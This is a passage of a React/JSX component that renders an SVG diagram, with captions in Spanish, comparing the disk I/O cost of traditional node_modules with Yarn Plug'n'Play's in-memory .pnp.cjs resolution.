      <text x="165" y="68" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">node_modules Tradicional</text>
      <text x="35" y="88" fill={textColor} fontSize="7.5">• 50.000 a 200.000 archivos sueltos en disco</text>
      <text x="35" y="101" fill={textColor} fontSize="7.5">• Node.js ejecuta cientos de syscalls stat() y read()</text>
      <text x="35" y="114" fill={textColor} fontSize="7.5">  buscando recursivamente en carpetas padre</text>
      <text x="35" y="127" fill={textColor} fontSize="7.5">• Tarda minutos en instalar o clonar</text>
      <text x="165" y="165" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Cuello de botella de I/O en disco</text>

      {/* Yarn PnP */}
      <rect x="335" y="50" width="280" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="475" y="68" fill="#818cf8" fontWeight="bold" fontSize="10" textAnchor="middle">Yarn Plug&apos;n&apos;Play (.pnp.cjs)</text>
      <text x="345" y="88" fill={textColor} fontSize="7.5">• node_modules NO EXISTE (0 carpetas)</text>
      <text x="345" y="101" fill={textColor} fontSize="7.5">• Genera un mapa estático JS en memoria: .pnp.cjs</text>
      <text x="345" y="114" fill={textColor} fontSize="7.5">• Dependencias leídas directo desde archivos .zip</text>
      <text x="345" y="127" fill="#10b981" fontSize="7.5" fontWeight="bold">• Tiempo de arranque de Node instantáneo O(1)</text>
      <text x="475" y="165" fill="#818cf8" fontSize="7" fontWeight="bold" textAnchor="middle">Resolución Determinista en Memoria</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">PnP ofrece cero tiempo de instalación, aunque exige compatibilidad mediante parches para herramientas heredadas.</text>
    </svg>
  );
  }
};
